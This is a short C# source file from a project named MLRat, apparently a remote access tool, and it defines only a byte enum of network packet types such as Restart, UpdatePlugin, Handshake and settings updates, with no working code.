namespace MLRat.Networking
{
    public enum NetworkPacket : byte
    {
        Restart,
        UpdatePlugin,
        DeletePlugin,
        Connect,
        Handshake,
        Checksums,
        PluginsVerified,
        UpdateSetting,
        UpdateSettingsDictionary,
        BasicSettingsUpdated
    }
}
